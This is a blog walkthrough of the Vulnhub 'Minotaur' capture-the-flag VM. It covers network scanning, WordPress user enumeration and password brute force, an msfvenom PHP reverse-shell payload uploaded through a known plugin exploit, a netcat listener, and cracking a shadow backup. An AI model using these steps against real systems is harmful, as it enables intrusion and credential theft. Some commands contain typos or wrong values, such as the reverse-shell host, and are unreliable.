---
layout: post
title: "SecTalks: BNE0x00 - Minotaur"
date: 2016-04-26 14:27:14 -0400
comments: true
categories: [vulhub]
---


From [Vulhub](https://www.vulnhub.com/entry/sectalks-bne0x00-minotaur,139/)

###Forces:

* netdiscover
* Nmap
* Wfuzz
* WPscan
* msfvenom
* John the Ripper


<!--more-->

Use netdiscover to detect target IP address

`netdiscover -i eth0 -r 192.168.56.0/24`

{% img  /images/blog/vulhub/bne03/Selection_001.png   [title manually exploit [alt text]] %}

192.168.56.223 is the target.


Then run nmap to detect opening ports and running services on the target machine.

`nmap -sV -v -O -A -T5 192.168.56.223 -p-`

{% img  /images/blog/vulhub/bne03/Selection_002.png   [title manually exploit [alt text]] %}

port 22, 80 and 2020 are opening.

use wfuzz to find more locations

`wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.56.223/FUZZ 2>/dev/null`


{% img  /images/blog/vulhub/bne03/Selection_003.png   [title manually exploit [alt text]] %}

found http://192.168.56.223/bull/

Check the page, looks like it uses wordpress. Good. maybe I can find out some outdated wordpress plugins.

{% img  /images/blog/vulhub/bne03/Selection_004.png   [title manually exploit [alt text]] %}

I use wpscan to find wordpress plugins vulnerabilities.

`uby wpscan.rb --url http://192.168.56.223/bull/`

get some xss vulnerabilities and an interestig arbutrart file upload vulnerability.

{% img  /images/blog/vulhub/bne03/Selection_005.png   [title manually exploit [alt text]] %}

next step, user enumeration.

`ruby wpscan.rb --url http://192.168.56.223/bull/ --enumerate u`

{% img  /images/blog/vulhub/bne03/Selection_006.png   [title manually exploit [alt text]] %}

get a user name `bully`


next step, password guessing:

`ruby wpscan.rb --url http://192.168.56.223/bull/ --wordlist SecLists/Passwords/passwords_john.txt threads 50`

no luck this time. Let's try harder..

we use cewl this time to generate password file

`cewl -w password.txt http://192.168.56.223/bull/`

also john the ripper should be used to mutate the password file:

`john --wordlist=password.txt --rules --stdout > out.txt`

now I use wpscan to brute force the password:

`wpscan --url 192.168.56.223/bull --wordlist out.txt --username bully`

{% img  /images/blog/vulhub/bne03/Selection_007.png   [title manually exploit [alt text]] %}


Now, create php reverse shell:

`msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.223 -a php --platform php -o evil.php`

based one wpscan scan result, the wordpress slideshow gallery shell upload exploit(https://www.exploit-db.com/exploits/34681/) is found. Save it as `wp_gallery.py`

run:

`python wp_gallery.py -t http://192.168.56.223/bull -u bully -p Bighornedbulls -f evil.php`


{% img  /images/blog/vulhub/bne03/Selection_008.png   [title manually exploit [alt text]] %}

set netcat 
`nc -nlvp 1234`

visit `http://192.168.56.223/bull/wp-content/uploads/slideshow-gallery/evil.php`

get the meterpreter

{% img  /images/blog/vulhub/bne03/Selection_009.png   [title manually exploit [alt text]] %}

locate flag.txt and get the result `/tmp/flag.txt`

find a file shadow.bak in /tmp, I got some interesting things:

{% img  /images/blog/vulhub/bne03/Selection_011.png   [title manually exploit [alt text]] %}

Looks like there are more chances to me. Download this file and use john to crack more.

`john --fork=4 shadow.bak`

now I have two more accounts info

{% img  /images/blog/vulhub/bne03/Selection_012.png   [title manually exploit [alt text]] %}

use python `python -c 'import pty; pty.spawn("/bin/bash")'`

Login as heffer:

{% img  /images/blog/vulhub/bne03/Selection_013.png   [title manually exploit [alt text]] %}

Login as minotaur:

{% img  /images/blog/vulhub/bne03/Selection_014.png   [title manually exploit [alt text]] %}


DONE.








